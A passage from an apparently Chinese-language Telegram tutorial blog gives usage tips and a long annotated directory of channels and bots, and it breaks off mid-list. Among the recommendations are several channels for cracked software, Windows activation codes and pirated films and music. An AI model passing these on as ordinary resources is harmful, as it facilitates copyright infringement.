格式 🗜️ 在限制多多的微信 App 上，小于 1 MB 的 GIF 图片才会自动播放。如何压缩： 打开 图贴式（网站），选择 GIF 压缩 宽度设置为 240，压缩质量 70（默认） 选择或拖拽一个或多个 GIF 到压缩窗口，开始压缩 压缩完成后，（推荐使用 IDM）打包下载 此时某些表情包可能大于 1 MB，需要再压一次： 方法一：修改 图贴式 的压缩质量等级（压得太狠会失真） 方法二：使用 docsmall（网站）或者 图压（软件）二次压缩 为什么不用 Photoshop 压缩 GIF？因为会产生毛糙的白边。 两外，推荐一个可以批量修改图片尺寸的网站：iLoveIMG 📊 投票功能 只支持在群组和频道中发起，因为 they feel lonely in one-on-one chats. 发起人 支持：匿名投票（Anonymous Voting）、多选（Multiple Answers）、答题模式（ Quiz Mode）。 不支持：修改发出的 Poll。 投票者 / 答题者 不满意长按或右击投票（Poll）可以撤回投票（Retract vote）。 缺点 Telegram 内置投票可被任意用户转发至其他对话内（如群组）进行投票，这对于公开性的投票来说是增加统计数据量的好方式，但该特性对于有私密/非公开需求的投票来说实为不利。（截止 2021 年 5 月 28 日 by TGgeek） 改善方法：通过 @vote 创建投票。 🖥️ 电脑版技巧 Windows 的 Ctrl 等于 macOS 中 Command ⌘。 快速多选：在对话界面的空白位置，按着鼠标左键不放，即可多选信息，然后选择转发或者删除。 链接直达：按住 Ctrl 再点击 URL，直接打开链接，不必弹窗确认（Open this link? CANCEL / OPEN）。 缩放图片：按住 Ctrl 再旋转鼠标的滚轮，即可放大或缩小图片。 快捷回复：直接在桌面右下角的消息弹窗里回复消息。 切换分组： Ctrl / Command + 1（对应第一个分组） Ctrl / Command + 2（第二分组） Ctrl / Command + 3（第三分组） …… 📖 通用技巧 🌐 互联开放 公开（Public）的频道或群组，是可以被搜索引擎抓取的（The contents of public channels can be seen on the Web without a Telegram account and are indexed by search engines.），并且不注册 Telegram 账号也看到公开频道或群组中的内容，方法就是在 Public link（公开链接）中加一个 s，例如在浏览器的地址栏输入 t.me/s/tingtalk，即可查阅庭说频道的所有内容。 一个用户最多可创建 10 个公开用户名（public usernames），包括公开的频道和群组。 🔍 搜索资源 去哪里找钟意的频道（Channel），群组（Group）和机器人（Bot）呢？ ☝️ 在 Telegram 内直接搜索关键词，但中文搜索识别较差。例如，「庭说」的频道是 https://t.me/tingtalk 搜索英文 tingtalk（t.me/ 后面的字符就是 ID），可以准确识别。 搜索中文 庭说，可能无法识别。 ✌️ 在 Google 上搜索，配合一些 Google 搜索技巧： 搜索结果较少：关键词 + site:t.me，例如 电子书 site:t.me 搜索结果较多：关键词 + telegram 及其别称，例如：电子书 telegram OR 电报 OR tg 这也再次证明了 Telegram 的内容是可以被 Google 等搜索引擎抓取的。反观国内的互联网江湖，各自割据，搞得网民苦不堪言。就拿微信来说，你不能在 Google 或者百度搜到公众号文章，这也是庭说另开一个独立博客的原因。 👌 Telegram 搜索引擎（非官方），可能包含不少 NSFW 内容。 索引机器人 @zh_secretary_bot @hao1234bot @hao6bot 网页版 Lyzem Search 名刀电报搜索 sssoou.com Telegram 公眾索引系統 tlgrm：只支持用英文关键词搜索 🔍 全局搜索 Search Filters: To quickly find a specific message or media item, search filters allow users to refine results by keyword, source, media type and time period – all at once. 这里指电报内的全局搜索。 隐藏技巧：如何按日期搜索？ 打开在 Telegram 移动端首页 点击搜索框 输入日期，即可按照日期筛选历史消息 2021：2021 年 01.2021 / Jan 2021：2021 年 1 月 01.13.2021：2021 年 1 月 13 日 📅 创建日期 在任意对话窗口（例如 Saved Messages）输入 https://t.me / ID / 1，例如 https://t.me/tingtalk/1 或者在浏览器的地址栏输入 https://t.me / s / ID / 1，例如 https://t.me/s/tingtalk/1 就会跳转到该群组或频道（未删除的）第一条消息，在其上方，可以看到创建日期（Channel created） ☁️ 多端同步 Telegram 可以在多个设备上同时使用。以下是我的设备列表： 2 台 Windows 电脑（开机自启） 1 部 Android 手机 1 部 iPhone 手机 1 个 网页端 …… 并且具备以下优势： 登录过的设备，下次登录时，不必再次扫描二维码或者输入密码。 云草稿（Cloud drafts）：除了消息可在各个平台同步之外，连未完成编辑的消息（草稿）都可以跨设备同步。Now you can start typing on your phone, then continue on your computer – right where you left off. 但是长文本还是不要放在草稿箱了，就怕 Bug 爬上来。如果草稿丢失，在桌面端按 Ctrl + Z 试试。 与 WhatsApp 不同的是，手机下线 Telegram 后，其他设备的 Telegram 并不会退出。 允许传送最大 2000 MiB 的文件，简直就是绝佳的「文件传输助手」： 把 Saved Messages（收藏夹）当作是 GTD 中 Inbox。并且每条保存的消息都有一个 ▶️ 按钮，可以将你带到最初发布消息的位置。 建立多个私人频道（无数量限制），分类存放你的信息和资讯。你甚至可以在 Telegram 上传本地音乐或者录音到自己的频道，建立自己的云端音乐播放库和播客（Podcast）。Create playlists by sending multiple songs at the same time. 📁 对话列表 在对话列表长按某个对话的左侧（头像）即可预览消息（Preview media）。 在对话列表长按某个对话的右侧： 删除对话（Delete chat）：勾选 Also delete for ***，即可同时删除双方所有的聊天记录。 不用经过对方同意。如果你的朋友遭遇不测，你可以及时清除消息来保护自己和对方。 反之，需要保留证据时，请及时截图或（在桌面端）导出聊天记录。 归档对话（Archive chat）：把不常用的群组和频道放到归档文件夹中，精简对话列表，Everything in its place。 在移动端的对话列表里，从顶部往下拉，即可看到「已归档对话」，长按可标记全部归档对话为已读状态。 当未设置静音的存档对话收到通知时，它将从归档列表中返回到聊天列表中。 📂对话分组 从 Settings &gt; Folders 进入 分组管理 设置： 最多创建 10 个分组。 每个分组都能置顶无数个对话（Unlimited Pins）。 默认分组 Unread：未读消息组，快速消灭未读红点。 Personal：个人私聊组。 Creat New Folder（新建分组）时有以下筛选条件可选： Contacts（联系人） Non Contacts（非联系人） Groups（群组） Channels（频道） Bots（机器人） …… 操作技巧 在对话列表界面，长按或者右击分组名可进行 Reorder（排序）、Edit（重命名）、Delete（删除）和 Mark ad read（标记为已读）等操作。 在 Telegram for Windows 中（macOS 电脑客户端同理），切换分组的键盘快捷键是： Ctrl + 0（收藏夹 Save Messages） Ctrl + 1（第一个分组） Ctrl + 2（第二个分组） Ctrl + 3（第三个分组） …… Ctrl + 9（已归档对话 Archived Chats） 目前只支持在电脑客户端中设置分组图标（Folder Icons）。 🔴 关闭通知 Settings（设置）&gt; Notifications and Sounds（通知和声音）。 Badge Counter（未读消息数量显示）：取消 Include Muted Chats（包含已关闭通知的对话） 如此设置，只有未静音的对话（私聊 / 群组 / 频道）来消息了，才会收到「小红点」。 🧹 清除缓存 此举只是暂时释放存储空间，因为媒体文件都会保留在 Telegram 云端，若需要可以再次下载，例如翻看历史消息的时候。 Settings（设置） Data and Storage（数据和存储） Storage Usage（存储使用情况） Clear Telegram Cache（清理缓存） 📲 导入数据 每个人都可以通过 WhatsApp、 Line 和 KakaoTalk 等应用程序将聊天记录（包括视频和文档）迁移到 Telegram 上。以 WhatsApp 为例： iOS 打开 WhatsApp 的联系方式或群组信息页面（Contact Info or Group Info） 点击导出聊天（Export Chat） 然后在共享（Share）菜单中选择 Telegram Android 打开 WhatsApp 聊天 点击更多（More） &gt; 导出聊天（Export Chat） 然后在分享菜单中选择 Telegram 借助 Telegram 的云存档功能，再也不用担心聊天记录丢失的问题。 🗃️ 导出数据 ⚠️此功能需在 Telegram 电脑版 上运行。 The original meaning of the paper plane on the Telegram logo means “freedom”. For us, freedom of choice and data portability are paramount. People should be in complete control over their own data – and their own lives. Telegram 标志上的纸飞机的原意是「自由」。对我们来说，选择自由和数据便携性是最重要的。人们应该完全控制自己的数据——以及自己的生活。by Pavel Durov 聊天历史会被存储在 Telegram 云端，但是也可以导出部分（或全部）聊天记录到电脑上离线回味，而且排版还是原来的样子。 打开 Telegram Desktop 选择某个对话 点击对话界面右上角的设置（三个点 ...） 导出聊天记录（Export chat history） 你也可以导出 Telegram 的所有数据。对，是所有，不仅仅是聊天记录，还有账号信息： 打开 Telegram Desktop 依次点击 Settings &gt; Advanced &gt; Export Telegram data 选择要导出的数据类型 🔞 解锁敏感内容 如何在 iOS 原生客户端查看敏感内容，例如 NSFW： 登录 Telegram Web（网页版）或者下载并登录 Telegram Desktop（客户端）。 Settings（设置）&gt; Privacy and Security（隐私和安全）。 Sensitive content（敏感内容） 客户端：打开 Disable filtering（关闭过滤） 网页版：打开 Show Sensitive Content 操作完成后，重新启动 iOS 原生客户端，即可 Display sensitive media in public channels on all your Telegram devices（允许在您所有登录 Telegram 的设备上显示公共频道内的敏感内容）。 📣 频道推荐 Channels 是向大众传播信息的完美工具（The perfect tool for broadcasting messages to the masses），类似微信公众号。 通过 Post Widget，你可以将频道或公共群组的任何消息嵌入到任何地方（You can embed messages from public groups and channels anywhere.）。 对于频道主 Hashtags：多用 # （标签）给消息分类，方便快速检索（点击高亮的关键词，或者在搜索框手动输入 # + 关键词），然后把标签放在置顶信息里或者频道介绍里。 频道分析（Channel Stats）📈：订阅人数超过 50 人（之前是 1,000 人）的频道会有详细的统计数据分析报告（Statistics）。 频道可以有无数个订阅者，但是创建者只能邀请前 200 个成员到你的频道。 重新编辑（Edit）消息，多久之前发的 Post 都可以。 支持删除消息通知，减少无关紧要的动态对订阅者的干扰。出现以下通知后，可立即长按删除： 更换频道置顶的消息通知 *** pinned *** 更换频道头像的消息通知 Channel photo updated 更改频道名字的消息通知 Channel name was changed to *** 对于订阅者 Subscriber Privacy：关注者无法得知频道创建者（creator）是谁，也无法得知谁关注了这个频道，但是频道主知道谁关注了频道。 频道/超级群组的关注上限是 500 个（具体数字未得到官方的求证），但是限制是一定存在的，因为限制提示语出现在官方翻译页面：抱歉，您已加入太多频道/超级群组。请先退出一些频道/超级群组后再加入。（Sorry, you have joined too many channels and supergroups. Please leave some before joining this one.） 如何通过 RSS 订阅 Telegram 频道 有些用户觉得 Telegram 用手机号码注册不安全，但是又想第一时间获得 Telegram 公开频道的更新，那么可以 借助 RSSHub 生成电报公开频道的 RSS 订阅链接，例如： https://rsshub.app/telegram/channel/tingtalk 只要把 tingtalk 替换成其他公共频道的 Permanent link（永久链接）后缀即可。 2020 年 9 月 30 开始，电报频道原生支持评论功能（Channel Comments） 首先要 在频道的设置里绑定一个群聊（Group），频道中的每条新帖子（new post）都会自动转发到该群组并被置顶（Pin）。 频道发送消息后，有两个评论入口： 频道：点击 Leave a comment 即可进入留言板（无需加入讨论组）。 群组： 第一层评论：引用（Reply）回复对应的频道消息。 第二层评论：接龙引用第一层评论。 第 N 层评论：以此类推。 通过 @LikeComBot 给频道的消息下增加 Emoji 按钮，例如 👍、👎、😐。 须知参差多态，乃是电报之福。术业有专攻，欢迎向我推荐其它领域的优质频道： 在 Telegram 搜索 @tingbot 简单说明推荐理由 优质频道将会更新在这篇《电报教程》里，让好内容得到更多的展现 以下是我收集的频道，不代表同意其观点，也许为了丰富文章内容。如果你发现某些频道开始「作恶」了或者失效了，请联系我从这个列表中删除。 2021 年，你需要多运动，多吃蔬果，偶尔听 播客，放下手机早点睡觉，少看鸡零狗碎的消息。 ✈️ 电报 频道 详情 Telegram News 👍 电报官方新闻频道。 Durov's Channel 👍 杜罗夫（Telegram 创始人和 CEO）的频道。 TGgeek 👍 TG 极客：分享 Telegram 使用技巧、重要资讯、常见问答、中文汉化、版本更新等信息。 Telegram Tips 👍电报小贴士（Tips）官方频道。 电报小助手 用简体中文同步翻译来自 @TelegramTips 的小技巧。 Telegram APKs for Android Official channel for Telegram Android APKs. You can also download them here. Telegram Designers 向电报提你想要的功能 @design_bot Desktop Themes Channel 电脑客户端主题创建指引 | Custom Themes 的简单介绍 Android Themes Channel 安卓客户端主题创建指引 | 更多技术细节参阅 Custom Cloud Themes Telegram Auditions 加入 Telegram Support Force，帮扶 Telegram 做大做强，详情参阅这份 Initiative。 Telegram Contests Here we announce Telegram coding contests in Android Java, iOS Swift, JS, C/C++. ISIS Watch 电报官方反恐频道：每日汇报有多少恐怖组织相关的频道被封了。 Trending Stickers Telegram 又新增了哪些表情包。 紙飛機 欢迎搭乘纸飞机，Porsche 和你聊聊 Telegram 的大小事。播客 RSS 订阅链接。 Anti Revoke Plugin Telegram 本地消息防撤回插件，安全性未知。GitHub 项目地址。 SCP-079-INFO 免费并开源的群组管理机器人，需 申请 通过后才能使用。查看项目介绍。 SE-索引公告板 Telegram 中文圈资源索引服务（包含 NSFW）。 电报指南 &amp; 精品排行榜 👍 电报中文群组和频道收录。 CN 导航 中文导航频道。 🦠 疫情 频道 详情 2019-nCoV 疫情实时播报 👍 COVID-19 中文消息 by NFNF。 Coronavirus Info 各国官方疫情通报频道列表（A list of official channels with information on COVID-19）。 Financial Times: Coronavirus news COVID-19 英文消息 by 金融时报。 📰 新闻 在一个后真相时代，要分清事实和观点: 对于事实，要有多个独立信源交叉验证。 对于观点，要注意论述逻辑和因果关系。 频道 详情 看鉴中国 OutsightChina 👍 一个健康的社会，不该只有一种声音。看鉴中国，每天聚焦一则关于中国的新闻事件，带你对比来自中外不同媒体多元的、不一样的观点。 乌鸦观察 👍 不定期推送新闻和杂谈。 有据 China Fact Check 是一个专注于对中文国际资讯进行事实核查的计划，是基于志愿和网络协作原则的事实核查计划，努力连接大学、媒体和平台三方力量。 新闻实验室 推荐订阅方可成老师的 Newsletter。微信公众号文章备份。 南方周末 在这里，读懂中国。非官方。 iDaily 每日环球视野。 新周刊 一本杂志和一个时代的体温。 南都观察 RSS 地址：https://www.nanduguancha.cn/rss 新闻联播（文字版） 《新闻联播》是中国中央电视台每日在北京时间晚间 19:00 播出的一個重点时政新闻节目，于 1978 年 1 月 1 日启播。 中国数字时代消息推送 致力于聚合「中国的社会与政治新闻，和它在世界上的新兴的角色」有关的报道和评论。 多数派Masses 我们是一群反对资本主义、反对帝国主义、反对父权制、反对一切压迫和宰制的青年。Matters 的创作空间站 | Newsletter 60 秒读懂世界 来自 60 秒读懂世界公众号。 突发新闻 突发新闻推送服务（简体中文）。 NFW News for Work, Not for Work. 电报时报 提供全天候热点中国及国际新闻，涵盖突发新闻、时事、财经、娱乐、体育，评论、杂志和博客等。 蘋果日報 Apple Daily 为香港上市公司壹传媒旗下繁体中文报纸，由大股东黎智英所创立，被民主派支持者普遍认为是香港目前唯一未被「染红」的媒体。by 维基百科 台湾 中央社 香港 苹果日报 如题。 竹新社 7×24 不定时编译国内外媒体的即时新闻报道。 NGOCN NGOCN 是一家中国独立媒体，非营利性质，致力向公众提供进步、负责任且多元的纪实性内容，目前由认同其理念志愿者运营。 端傳媒 Initium Media 由程式自動獲取並推送端傳媒 RSS 所有文章，链接至官网。 端传媒 RSS 链接至 Telegraph 和官网。RSS 地址：https://rsshub.app/initium/latest/zh-hans 端传媒 每日推送端传媒（付费）文章.pdf。手头宽裕，还是 付费购买端会员 或购买 新闻通讯 Newsletter。 🌐 国外媒体（简体中文） 频道 详情 纽约时报中文网 👍 The New York Times (NYT) 创刊于 1851 年，世界上最著名的报纸之一。美国严肃报刊的代表，获得过 122 项普利策奖，是获奖最多的媒体。 BBC 中文网 BBC News 是世界最大的公共广播公司，位于英国，资金主要来自英国国民缴纳的电视牌照费，是一家独立运作的公共媒体（非商业媒体，也不由英国政府控制）。 联合早报 zaobao.sg 早报 + 晚报 + 新明新闻。 路透中文网 Reuters 世界三大通讯社之一，成立于 1851 年，总部位于英国伦敦。 德国之声 Deutsche Welle (DW) 按德国公法设立的国际化公共媒体，从联邦政府获得拨款，总部位于波恩和柏林。 澳大利亚广播公司 Australian Broadcasting Corporation (ABC) 是澳大利亚的国家公共广播机构，它由政府出资，向澳大利亚和海外提供电台、电视、互联网服务。总部设在悉尼。 法国国际广播电台 Radio France Internationale (RFI) 是法国专责世界大部分地区之国际广播的电台广播机构，现隶属法国国营国际广播公司法国世界媒体旗下。by 维基百科 美国之音中文网 Voice of America (VOA) 成立于 1942 年 2 月，是美国政府对外设立和资助的国有非军事国际广播宣传喉舌，由美国国际媒体署管理，旗下拥有广播电台与电视台，总部座落在首都华盛顿。by 维基百科 华尔街日报 RSS 地址：https://feedx.net/rss/wsj.xml 俄罗斯卫星通讯社新闻 Sputnik 是俄罗斯政府控制的新闻机构今日俄罗斯媒体集团于 2014 年 10 月开通的新闻通讯社、新闻网站、广播电台与媒体新闻中心。by 维基百科 韩国新闻 朝鲜日报 + 中央日报中文版 日本新闻 共同网 + 朝日新闻中文网 + 日本经济新闻中文版 双语新闻 纽约时报双语新闻 + 中国日报网英语点津 Twitter Subscription 搬运以下 Twitter 账号：BBC News 中文、DW 中文- 德国之声、国际特赦组织中文、纽约时报中文网。 新闻播报 PDF 每天为大家送来 NYT 和 BBC 的新闻 PDF。 What's News 推送各种英文外刊和杂志的 PDF。 以上部分介绍来自西方媒体查一查。查询可信度和倾向性，请安装 浏览器插件，或者访问 微信小程序。 💸 财经新闻 频道 详情 财经快讯 全球财经资讯 24 小时不间断直播。 FT 中文网 Financial Times（金融时报）创刊于 1888 年，编辑总部位于伦敦，2015 年被日本经济新闻收购。 💾 科技 频道 详情 少数派 👍 少数派致力于更好地运用数字产品或科学方法，帮助用户提升工作效率和生活品质。 Solidot 👍 奇客的资讯，重要的东西。 Newlearnerの自留地 👍 不定期推送 IT 相关资讯。 Appinn Feed 👍 分享免费、小巧、实用、有趣、绿色的软件。 科技爱好者周刊 👍 记录每周值得分享的科技内容，周五发布；非官方频道。科技爱好者周刊合集。 TestFlight 科技花 👍 发布科技新闻、App 测试版链接、软件使用相关话题。 Hacker News Top stories from news.ycombinator.com (with 100+ score). 科技圈的日常 科技圈内的大事小事。 Telegram 中文 NEWS 聪聪 的频道：提供印象笔记、Telegram、科学上网等新闻。Telegram 知识汇总。 每日消费电子观察 不公正，不客观，不理性。 cnBeta cnBeta.COM 中文业界资讯站是一个提供 IT 相关新闻资讯、技术文章和评论的观点的中文网站。 IT 之家 RSS 地址：https://www.ithome.com/rss/ 果核 Apple Nuts 一个果粉（Hackl0us）的闲言碎语， 用来推送苹果（Apple） 相关的技术、新闻资讯、技巧、产品/软件心得体会等。 APPDO 数字生活指南 优质数字生活指南，传递数码生活和设计理念。 AppPie Apple 相关的数字生活指南。 VPS 信号旗播报 关注 VPS 和通信自由。 硬核小卒 分享优质的科技/商业资讯。 知乎日报 越来越难用的问答网站。 Daily Tech News 每日科技新闻。 每日 AWESOME 观察 每日更新分享最炫酷的开源项目。 LetITFly News 主题包括但不限于 Android、Windows、Web、消费电子相关，吹水为主。 📚 博主 频道 详情 庭说 👍 第一时间获取博客的更新通知以及碎片化思考。 小破不入渠 👍 科技评论人 Jesse Chan，博客是 大破进击。 一天世界 👍 一天世界，昆乱不挡。不鸟万如一主理。IPN 出品。 caoz 的梦呓 👍 认识曹政之后，感觉互联网终于入门了。by Fenng ZUOLUOTV 👍 科技 / 旅行 / 摄影 / 生活方式 / 博客 不求甚解 👍 Newlearnerの自留地 编辑；设计师 oooooohmygosh 的代言人。 小道消息 大道无形，小道消息；公众号备份站点。 卖桃者说 博客是 MacTalk：池建强的随想录关注技术和人文。 数字移民 无法肉身移民的情况下，在数字生活上追求一定的自由；博客。 Real Spencer Woo 开发者 / 设计师 / 少数派 / 学生 / 博客。 Sukka's Notebook Belongs to Hexo dev team / 博客。 扫地僧笔记 每天所见所闻所想，是个树洞。 一方天地 心留一方天地，世界依旧美好。 湾区日报 关注创业与技术，不定期推送 5 篇优质英文文章。 海龙说 牢记梦想，自然生长。by 郝海龙的博客 荔枝木 这个世界很复杂，我尝试着去理解它。 KAIX.IN 思考碎片，博客 更新。 TSBBLOG 影子的博客：独立观察及记录。 AK 讲废话 科普视频系列：无线技术、显示技术、翻墙技术…… P3TERX ZONE P3TERX 读作 Peter X。 值物志 分享各种值得尝试的事物：值得读的书、值得用的软件、值得看的电视剧…… 小虎の自留地 讨论家装心得或者有趣实用的家具电器。 Leonn 的博客 低价主机（VPS）资源。 Yachen's Channel 刘亚晨是 Surge 的开发者| Yachen's Blog BennyThink's Blog 随便分享点什么，可能是某部剧，可能是某首歌，可能是一点点感动的瞬间，也可能是我最爱的老婆。 MolunSays 希冀笔尖之下，世界兴旺繁华 | 博客 日常人间观察 关心科技 / 人文 / 艺术 / 城市公共空间 / 女性和性别议题 / 劳工权益 / 个体叙事 / 电影 / 音乐 / 书 / 星星…… In The Flux 关于文化、艺术与技术的信息流。 为也行 「书籍 | 电影 | 资源 | 技巧 | 摸鱼图」大多原创，少部分转发。 Jerry Zhang 的频道 在渥太华的长春人。博客：Overflow，向信息过载的世界大喊。播客：《科技聚变》（TechFusion），我们谈论有关互联网的一切。 老人和糟 没有频道简介，科技相关。 Karen 医生の日常 一个小医生的通讯站。不想出名，只传播一些信息和科普。 𝑾𝒊𝒌𝒊𝑫𝑩 The right way, or the easy way. 人海拾贝FlipRadio 翻转电台的 Channel，一些零零散散的要分享的东西。 Find Blog 发现优秀的博客与创作者。 TomBen’s Web Excursions PhD Student、Productivity Enhancer、Writing Enthusiast 博客 | 少数派 熊言熊语 「熊言熊语」是一档关注学习分享和知识科普的 播客 栏目，我们希望用声音记录改变与成长。思考问题的熊和他的朋友们一起聊学习工作、聊科研科普。博客 | Newsletter 中文独立博客列表 by timqian 🔔 RSS 频道 详情 RSSHub 布告栏 万物皆可 RSS。 All About RSS 关于 RSS 技术的应用、周边、介绍、方法、教程、指南、讨论、观点。 RSS 频道收集 收集推送 RSS 的频道，把 TG 变成 RSS 阅读器。 🎞️ 影视 频道 详情 4K 影视屋 蓝光无损电影。 电影频道 想看什么电影请在评论区留言。 远鉴字幕组发布频道 本字幕组致力于非院线海外电影及海外剧集的译制与分享。 人人影视字幕文件 这个频道与人人影视及其字幕组无任何关联。 霸王龙发布频道 做一个有温度，有思想，懂粉丝的压制组。每天定时更新，选取优质影片源。专注于韩美剧，经典的电影榜单。 苍炎影院 分享最新最热门的优质电影。 迷影果醬 无规律放映影片。 4K 影视屋 4K 电影种子发布频道。 四库全书视频精选 一个不断收集互联网有价值内容的企划。 电影爱好者 附带豆瓣电影评分。 🎙 播客 频道 详情 「利器x播客」计划 官网 独立播客 分享关于播客的一切。by Zac 中文播客精选 分享精选优质中文播客，目前推荐单期节目为主。by 白昼电台 的主播 Stella Your Daily Dose of Podcast 每天推荐一集让人心潮澎湃、若有所思、打开新世界大门的播客节目。by 穿堂风推荐的播客会同步更新在 Medium我在豆瓣上分享了 400 集播客节目，有什么用？ 交差点 Technology alone is not enough. 不客观 Not Objective 一档搭建在 Telegram 的简易播客，纯主观感受。by 郝海龙 白昼电台 The Day 黑夜已深，白昼将近，我们就当脱去暗昧的行为，带上光明的兵器。 维生素 E 经济学与哲学知识分享。 Go 夜聊 一档由杨文和欧长坤主持的针对 Go 语言的播客节目 阿乐杂货铺 这里每日推送小人物播客及播客周边；职业发展、自我成长、读书电影、海外工作与生活碎片。 🎵 音乐 频道 详情 知音 👍 发一些关于音乐的东西。 Imusic 音乐，就是理想的挽歌，年代久远，依然飘扬。 杂鱼Music Channel 我相信，爱音乐的人都有着一颗柔软的心。 音乐世界 温柔被我唱成了歌，伴你人山人海不停留。 心声：音乐分享频道 分享一些能引起共鸣的音乐。 每日一歌 愿你也能在这里找到属于你自己的共鸣。 Classical Music 一起来听古典音乐吧。 蛙音通讯 Feels wonderful again man. 无损音乐频道 分享无损音乐、高品质音乐、原碟整轨分轨音频。 浦镇青年 李志。 崔健无损 中国大陆摇滚先驱者。 音乐分享频道 一般为无损音乐。 音乐屋 发现音乐新世界：live、黑胶、磁带 下载音乐，还可以查阅下文中提到的音乐机器人。 🏫 读书 人类的悲喜并不互通，但读书是走向共同理解的捷径。 频道 详情 Word Power Made Easy 利用词根（原始印欧语、拉丁语、古希腊语）学习英语单词。 英语精读学习 夜空中最亮的星，就是你自己！我们一起精读英语，一起进步，遇见更好的自己吧！资料不定时更新哟！ ENGLISH PODCASTS INFINITY PODCASTS CHANNEL WITHOUT ANY LIMITS. 中文社科讲座资讯 一个讲座信息聚合和 PPT 共享平台。 ReadFine 电子书屋 致力于电子书分享的读书频道。EPUB 电子书一站式阅读体验（包括豆瓣评分、书籍简介、封面截图），一键下载，享受读趣。 什么书值得读 仅推送某亚原版资源，可同时下载 .azw3 .epub .mobi 的电子书。 好书分享频道 学习，是一辈子的大事。 小声读书 一个探索数字阅读可能性和未来的开放项目，致力于打破信息茧房，挖掘价值信息。 值得一看的文章 阅读更少，收获更多。 云上报刊亭 英文报刊杂志、电子书、报纸和外文杂志精选。 Λ-Reading 分享书和阅读、认知科学、科技哲学、新科技以及其它给生活带来一丝美好的事物 | Newsletter 臭（xiù）文字 诗歌频道；我是一个嗅觉特别发达的人，你说，然而，没有一种艺术可供我的鼻子用武，只有生命可以。 已有丹青約［書畫］ 高清油画档案（超过两万张）。 插播一个免费的广告：学英语，推荐购买郝海龙老师的《英语自学手册》（￥119）。 🚀 翻墙 软件 频道 详情 Fndroid 的日常 👍 Clash for Windows Clash .NET 公告 A Clash GUI Proxy For Windows Based On .NET 5 Clash for Android Channel A Graphical user interface of Clash for Android SagerNet Apks 支持 SOCKS、HTTP(S)、Shadowsocks、ShadowsocksR、VMess、VLESS、Trojan……等协议 Shadowrocket News iOS 上小火箭 Quantumult News Quantumult 的非官方频道。 Quantumult X News 此频道用于发布 Quantumult 与 Quantumult X 的相关资讯。 迷雾通（Geph） 与众不同的开源翻墙软件，提供完全免费的中速浏览，够浏览新闻、查邮件、看标清视频等。超快速度的付费 Plus 账号仅需 €5/月。截至 2021 年 5 月 29 日，暂不支持 iOS 设备。 协议 &amp; 脚本 &amp; 规则 频道 详情 V2Fly Shadowsocks 是一个纯粹的代理工具，而 V2Ray 定位为一个平台，任何开发者都可以利用 V2Ray 提供的模块开发出新的代理软件。by 新 V2Ray 白话文指南 ACL4SSR https://github.com/ACL4SSR/ACL4SSR 官方频道。 QuanX &amp; Surge &amp; Loon 脚本收集 各种脚本。 Cool Scripts QuanX, Loon, Surge, JsBox, Pythonista, Scriptable, Shortcuts 等脚本分享。 DivineEngine 神机规则 评测 频道 详情 毒药机场评测 由于大陆地区网络环境十分复杂，测速不代表推荐。另外，有些机场会泄露个人信息，选购时多加搜索或者进入机场用户群打探打探。 科学上网与机场观察 科学上网与机场相关观察、点评、随想和新闻资讯。 人人翻墙，则墙自倒 免费提供 Trojan、Vmess 节点。 关联阅读 番茄食用指南（科学上网教程） | 庭说 番茄种植指南（梯子搭建教程） | 庭说 🗄️ 搬运 频道 详情 煎蛋无聊图 自动抓取煎蛋首页推荐无聊图及其评论。 内涵段子：皮一下 如题。 美图与沙雕 如题。 糗事百科 如题。 心惊报 又一个沙雕图频道，每日随缘更新。 你知道的太多了 不定期发布和转载各类不一定靠谱的内幕、流言蜚语、小知识等。 蛋挞报 分享阅读体验。 微信搬运工 有些微信的内容分享了之后就和谐了，本频道可以做个备份，以及丰富电报上的中文内容（不可否认还是有很多非政治的优质内容在微信公众号里）。 微博精选 来自微博的文章、资源和观点。 豆瓣精选 豆瓣书影音，以及相关讨论。 鹅组精选 豆瓣鹅组 非官方搬运。 即刻精选 精选即刻 app 热门话题更新。我的即刻 ID 是 Dr_Ting。 你不知道的内幕消息 同时抓取来自即刻 app 的 #大公司的负面新闻。 Matters 閲讀精選 matters.news 一個自主、永續、有價的創作與公共討論空間。 🆓 资源 频道 详情 Google Play 限免信息 不定时推介 Play Store 上的限免游戏和 App。 纯粹的 App Store 应用推荐 iOS 实用免费、精选限免、优质冰点应用推荐。 反斗限免 这里有反斗软件和反斗限免的文章更新。更新频繁高。 如有乐享 更新 如有乐享博客 的内容：云服务器、优惠活动、羊毛信息以及各种 Bug。 iShare News 一个没有简介的资源分享频道。 Zapro Notice 软件分享。 App 喵 破解软件资源共享。 Google Drive 资源 各种 Google Drive 资源，包括电影、电子书、无损音乐等，10 万+ 关注。 Google Voice 靓号 一个 GV 卖家。 Windows 10 激活码分享 🤫 😺 其它 频道 详情 iYouPort IYP 不是过眼云烟的新闻网站，我们提供实战能力，这里是值得您反复回看的档案室。 安全上网注意事项 转载一些关于安全上网的文章，这些文章都比较浅显。 博海拾贝 博海拾贝 的网站：bh.sb 回形针PaperClip &amp; 灵光灯泡 回形针内容推送。 合租 Netflix、YouTube、Spotify、Office 365、HBO、Apple、Surge…… History Digging Past. Photos from Past who shaped today. 每日无数猫 让我们打造一个全是猫的世界！ฅ•ﻌ•ฅ NS 新闻转报 任天堂（Nintendo）相关的新闻。 基督讲道 基督讲道资源频道。 就要造反 此频道立足生活，以非常古怪的文字风格进行生存经验书写，绘制景观与消费社会中极具现实性的个案，以此为个体提供可操的、创造性的抵制策略与造反计谋。为一切造反者辩护，为所有无用与丰饶辩护。 One Piece Deluxe Receive the latest updates from One Piece (海贼王), including chapters, episodes, spoilers and much more. 海贼王 One Piece 更新提醒 由初中开始追《海贼王》 @TingTalk 创建。 此外，Telegram 上也有 国家或地区的领导人官方频道。 🤖 机器人推荐 Bots 就像运行在 Telegram 内部的小程序。借助 Telegram 开放的 APIs，可以实现很多让你意想不到的功能。 💠 内联机器人 在任意对话界面的消息编辑框，输入 Inline Bots 的名字，即可将 Ta 们唤醒（Just type @inlinebots keywords in any chat.）。 Bot Info @bing 图片搜索 by Bing（支持中英文）。 @bold 👍 使用 Markdown 编辑消息（有字数限制）。 @coub Coub 是一个视频共享网站（时长十秒的循环视频）。 @creationdatebot 获取注册 Telegram 的日期。 @fanyi_bot 为全世界语言提供中文翻译。 @foursquare 帮你找到附近的餐馆或附近的地方，并将其地址发送给朋友。 @gamee 在群组中输入 @gamee，选择一个游戏，立刻和你的朋友 在 Telegram 上玩小游戏。 @gif 👍 GIF 动图搜索，支持中文。例如 @gif 你好。 @imdb 查看影视作品在 互联网电影资料库（IMDb）的评分。 @GoogleDEBot 在任意聊天框使用 Google 搜索引擎。 @like 👍 添加 emoji-based like buttons，例如 👍 / 👎。在搜索框输入 